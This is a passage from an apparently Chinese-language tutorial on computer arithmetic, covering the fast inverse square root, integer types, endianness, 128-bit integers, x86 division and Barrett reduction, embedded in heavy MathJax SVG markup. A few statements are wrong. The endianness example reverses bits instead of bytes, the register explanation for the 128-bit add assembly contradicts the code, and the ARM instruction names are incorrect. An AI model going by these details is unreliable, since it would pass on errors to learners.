193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(523,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(523,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="mn" transform="translate(1580.5,-686)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><rect width="3421" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(4453,0) translate(0 -0.5)"><path data-c="29" d="M33 1741Q33 1750 51 1750H60H65Q73 1750 81 1743T119 1700Q554 1207 554 251Q554 -707 119 -1199Q76 -1250 66 -1250Q65 -1250 62 -1250T56 -1249Q55 -1249 53 -1249T49 -1250Q33 -1250 33 -1239Q33 -1236 50 -1214T98 -1150T163 -1052T238 -910T311 -727Q443 -335 443 251Q443 402 436 532T405 831T339 1142T224 1438T50 1716Q33 1737 33 1741Z"></path></g></g></g></g></svg></mjx-container></span> 代码中实现如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">x2 = number * <span class="number">0.5F</span>;</span><br><span class="line">y  = y * ( threehalfs - ( x2 * y * y ) );</span><br></pre></td></tr></table></figure></div>
<p>这样我们用<strong>平方根倒数速算法</strong>得到的初始值就比较接近真实值，第一次迭代后，结果已经精确到正确答案的99.8%，并且可以通过多次迭代进一步提高精度——这就是硬件中的实现方式：x86指令进行几次迭代，确保相对误差不超过
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="9.821ex" height="1.937ex" role="img" focusable="false" viewBox="0 -833.9 4340.7 855.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(778,0)"></path></g><g data-mml-node="mo" transform="translate(1500.2,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(2500.4,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container></span>。</p>
<h4 id="整数运算">整数运算</h4>
<p>虽然整数的表示形式相对简单，但它的简洁性使得很多操作可以通过其他操作来表达。而浮点数的表示形式复杂，以至于许多操作都需要硬件实现。而高效处理整数运算需要在指令集上更加巧妙的应用。关于无符号整型以及有符号整型等的表示方法这里不在赘述。</p>
<p><strong>整数类型</strong></p>
<p>整数有不同的大小，但它们的基本操作方式大致相同。以下是常见的整数类型及其对应的字节和C语言数据类型：</p>
<table>
<thead>
<tr>
<th>位数</th>
<th>字节数</th>
<th>有符号类型</th>
<th>无符号类型</th>
<th>汇编</th>
</tr>
</thead>
<tbody>
<tr>
<td>8</td>
<td>1</td>
<td>signed char</td>
<td>unsigned char</td>
<td>byte</td>
</tr>
<tr>
<td>16</td>
<td>2</td>
<td>short</td>
<td>unsigned short</td>
<td>word</td>
</tr>
<tr>
<td>32</td>
<td>4</td>
<td>int</td>
<td>unsigned int</td>
<td>dword</td>
</tr>
<tr>
<td>64</td>
<td>8</td>
<td>long long</td>
<td>unsigned long long</td>
<td>qword</td>
</tr>
</tbody>
</table>
<p><strong>字节顺序</strong>（Endianness）</p>
<p>整数的字节存储顺序存在两种可能性：</p>
<ol type="1">
<li><strong>小端（Little-endian）</strong>：低位字节存储在前。例如，42<sub>10</sub>
= 101010<sub>2</sub> 会存储为 010101。</li>
<li><strong>大端（Big-endian）</strong>：高位字节存储在前。所有前面的例子都采用了大端。</li>
</ol>
<p>小端有一个优势是，转换数据类型时（如将64位整数转换为32位整数），可以通过加载较少的字节（几乎不需要额外操作）来实现类型转换。而大端则有助于提升某些操作的效率，比如比较和打印。</p>
<p><strong>128位整数</strong></p>
<p>有时我们需要将两个64位整数相乘，得到一个128位整数。由于没有128位寄存器来存储这个结果，乘法指令通常会将结果分为两个部分：低64位和高64位。</p>
<p>例如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 输入：64位整数a和b，存储在rsi和rdi寄存器中</span><br><span class="line">; 输出：128位乘积a * b，存储在rax（低64位）和rdx（高64位）</span><br><span class="line">mov     rax, rdi</span><br><span class="line">mov     r8, rdx</span><br><span class="line">imul    rsi</span><br></pre></td></tr></table></figure></div>
<p>有些编译器提供了对128位整数的支持。例如，在GCC和Clang中，提供了<code>__int128</code>类型。</p>
<p>例如：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">prod</span><span class="params">(<span class="type">int64_t</span> a, <span class="type">int64_t</span> b, __int128 *c)</span> {</span><br><span class="line">    *c = a * (__int128) b;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p><strong>128位整数的典型使用场景：</strong>
在没有直接支持128位整数的系统中，这些大整数通常会被分成两个64位寄存器。当需要存储两个64位整数相乘的结果时，结果将是一个128位的数字。由于没有128位寄存器，这个结果会被存储在两个独立的64位寄存器中——一个存储低64位，另一个存储高64位。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">__int128_t</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="type">int64_t</span> hi = x &gt;&gt; <span class="number">64</span>;    <span class="comment">// 提取高64位</span></span><br><span class="line"><span class="type">int64_t</span> lo = (<span class="type">int64_t</span>) x;  <span class="comment">// 提取低64位，截断高位</span></span><br></pre></td></tr></table></figure></div>
<p>在上面的例子中：</p>
<ul>
<li>通过将<code>x</code>右移64位，提取出128位值的高64位。</li>
<li>低64位通过将128位类型强制转换为64位类型来提取，这会丢弃高64位（即截断）。</li>
</ul>
<p><strong>128位整数的限制：</strong>
除了乘法运算，128位整数通常作为两个独立的64位寄存器进行处理。因此，在大多数情况下，使用一个完整的128位类型并不实际，因此对其的支持通常仅限于诸如乘法之类的操作。以下是一个简单的128位整数加法函数的例子，它使用了两个64位寄存器：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">__int128_t</span> <span class="title function_">add</span><span class="params">(<span class="type">__int128_t</span> a, <span class="type">__int128_t</span> b)</span> {</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>当这个函数被编译时，它会被转换成汇编代码，通过两个64位值来进行处理。例如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">add:</span><br><span class="line">    mov rax, rdi          ; 将第一个操作数a的低64位（rdi）移动到rax寄存器</span><br><span class="line">    add rax, rdx          ; 将第二个操作数b的低64位（rdx）加到rax，若溢出，则设置进位标志</span><br><span class="line">    adc rsi, rcx          ; 如果进位标志被设置，则将1加到rsi（即b的高64位）</span><br><span class="line">    mov rdx, rsi          ; 将结果移动到rdx寄存器（结果的高64位）</span><br><span class="line">    ret                   ; 返回结果</span><br></pre></td></tr></table></figure></div>
<p>在这段汇编代码中：</p>
<ul>
<li><code>rax</code>和<code>rdx</code>分别存储操作数<code>a</code>的低64位和高64位。</li>
<li><code>rsi</code>和<code>rcx</code>分别存储操作数<code>b</code>的低64位和高64位。</li>
<li>对两个部分分别进行加法操作，进位操作（<code>adc</code>）确保了低64位加法溢出时，高64位部分正确处理。</li>
</ul>
<p><strong>其他平台：</strong>
其他平台，如ARM，使用专门的指令（如<code>mulhi</code>、<code>mullo</code>）来返回乘法结果的高低部分，这使得处理大于字长的值变得更容易。类似地，x86
SIMD扩展也有32位指令来处理此类情况。</p>
<h4 id="整数除法">整数除法</h4>
<p>与其他算术操作相比，<strong>除法</strong>通常表现得非常糟糕。无论是<strong>浮点数</strong>还是<strong>整数</strong>除法，硬件实现都非常复杂。其电路在算术逻辑单元（ALU）中占用了大量空间，计算过程涉及多个阶段，因此除法指令（<code>div</code>）及其相关操作通常需要10到20个时钟周期来完成。较小的数据类型可能会稍微减少延迟，但除法操作的复杂度和延迟依旧较高。</p>
<p>由于没有人想为取余操作单独实现一套逻辑，<code>div</code>指令同时负责<strong>除法</strong>和<strong>取余</strong>的计算。要执行一个32位整数除法，必须将<strong>被除数</strong>放入<code>eax</code>寄存器，并将<strong>除数</strong>作为唯一操作数传递给<code>div</code>指令。执行后，商（<strong>quotient</strong>）将存储在<code>eax</code>寄存器中，而余数（<strong>remainder</strong>）则存储在<code>edx</code>寄存器中。</p>
<p>需要注意的是，被除数必须存储在两个寄存器中：<code>eax</code>和<code>edx</code>。这种机制使得64位除以32位甚至128位除以64位的除法成为可能，类似于128位乘法的处理方式。在执行普通的32位整数除法时，我们需要将<code>eax</code>寄存器的值扩展为64位，并将高位部分存储在<code>edx</code>中：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">div(int, int):</span><br><span class="line">    mov  eax, edi    ; 将被除数（eax）从 edi 传入</span><br><span class="line">    cdq              ; 扩展 eax 为 64 位并存入 edx</span><br><span class="line">    idiv esi         ; 执行有符号除法</span><br><span class="line">    ret              ; 返回</span><br></pre></td></tr></table></figure></div>
<p>为了理解为什么需要扩展的实现，我们先来了解以下<code>cdq</code>指令是什么。<code>cdq</code>
的全称是 <strong>Convert Double to Quadword</strong>，它的作用是：</p>
<ul>
<li><strong>输入</strong>：<code>eax</code>（32 位整数）</li>
<li><strong>输出</strong>：
<ul>
<li>如果 <code>eax</code> 是正数，<code>edx</code> 设为
<code>0</code></li>
<li>如果 <code>eax</code> 是负数，<code>edx</code> 设为
<code>0xFFFFFFFF</code>（即 <code>-1</code>）</li>
</ul></li>
</ul>
<p>换句话说，<code>cdq</code> 负责对 <code>eax</code> 进行
<strong>符号扩展</strong>，确保 <code>edx:eax</code> 组成一个正确的
<strong>64 位被除数</strong>。x86 的
<code>idiv</code>（<strong>有符号除法</strong>）和
<code>div</code>（<strong>无符号除法</strong>）指令是针对 <strong>64
位被除数 ÷ 32 位除数</strong> 设计的，而 <code>eax</code> 只有
<strong>32 位</strong>，为了让 <code>idiv</code>
进行除法运算，必须扩展为 <strong>64 位</strong> 存储在
<code>edx:eax</code> 组合中。</p>
<p>对于无符号除法，你只需将<code>edx</code>寄存器置为0，以避免它干扰计算：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">div(unsigned, unsigned):</span><br><span class="line">    mov  eax, edi    ; 将被除数（eax）从 edi 传入</span><br><span class="line">    xor  edx, edx    ; 清空 edx</span><br><span class="line">    div  esi         ; 执行无符号除法</span><br><span class="line">    ret              ; 返回</span><br></pre></td></tr></table></figure></div>
<p>在这两种情况下，除了<code>eax</code>中的商外，你还可以通过<code>edx</code>访问余数。</p>
<p><strong>取余操作</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mod(unsigned, unsigned):</span><br><span class="line">    mov  eax, edi    ; 将被除数（eax）从 edi 传入</span><br><span class="line">    xor  edx, edx    ; 清空 edx</span><br><span class="line">    div  esi         ; 执行无符号除法</span><br><span class="line">    mov  eax, edx    ; 将余数（edx）存入 eax</span><br><span class="line">    ret              ; 返回</span><br></pre></td></tr></table></figure></div>
<h5 id="优化方式">优化方式</h5>
<p>整数除法在 CPU 中的执行速度通常非常慢，即使是完全由硬件实现的
<code>div</code>
指令，其执行周期也远高于加法或乘法。为了解决这个问题，如果
<strong>除数是一个常数</strong>，可以使用一些优化技巧，将
<strong>除法转换为乘法</strong>，以提高效率。</p>
<p>如果除数是 <strong>2 的幂</strong>，可以使用
<strong>二进制移位</strong> 来替代
<code>div</code>，从而极大地提高计算速度：</p>
<ul>
<li><code>x / 2^n</code> 可以用 <strong>右移</strong>
(<code>x &gt;&gt; n</code>) 代替。</li>
<li><code>x % 2^n</code> 可以用 <strong>按位与</strong>
(<code>x &amp; (2^n - 1)</code>) 代替。</li>
</ul>
<p>还有种方式是在编译阶段<strong>估算</strong>除数的倒数<strong>d</strong>，然后在运行时直接乘上d即可。</p>
<h5 id="barrett-约简barrett-reduction">Barrett 约简（Barrett
Reduction）</h5>
<p>上述<strong>d的估算</strong>成了我们现在待解决的问题，我们可以改写d为：
<span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.552ex;" xmlns="http://www.w3.org/2000/svg" width="7.258ex" height="4.081ex" role="img" focusable="false" viewBox="0 -1118 3208.2 1804"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(797.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(1853.6,0)"><g data-mml-node="mi" transform="translate(238.3,676)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="msup" transform="translate(220,-686)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,289) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><rect width="1114.6" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container></span> 其中 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.986ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 878 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></span>
是一个“魔数”（magic number），<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="1.061ex" height="1.023ex" role="img" focusable="false" viewBox="0 -442 469 452"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g></g></svg></mjx-container></span>
是一个合适的二进制移位数，使得： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="18.685ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 8258.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="230A" d="M174 734Q174 735 175 737T177 740T180 744T184 747T189 749T196 750Q206 748 214 735V-210H310H373Q401 -210 411 -213T422 -230T411 -247T369 -251Q362 -251 338 -251T298 -250H190Q178 -246 174 -234V734Z"></path></g><g data-mml-node="mi" transform="translate(444,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(1016,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mi" transform="translate(1516,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2006,0)"><path data-c="230B" d="M229 734Q229 735 230 737T232 740T235 744T239 747T244 749T251 750Q262 748 269 735V-235Q266 -240 256 -249L147 -250H77Q43 -250 32 -247T21 -230T32 -213T72 -209Q79 -209 99 -209T133 -210H229V734Z"></path></g><g data-mml-node="mo" transform="translate(2727.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(3783.6,0)"><path data-c="230A" d="M174 734Q174 735 175 737T177 740T180 744T184 747T189 749T196 750Q206 748 214 735V-210H310H373Q401 -210 411 -213T422 -230T411 -247T369 -251Q362 -251 338 -251T298 -250H190Q178 -246 174 -234V734Z"></path></g><g data-mml-node="mi" transform="translate(4227.6,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(5021.8,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mi" transform="translate(5522,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(6400,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 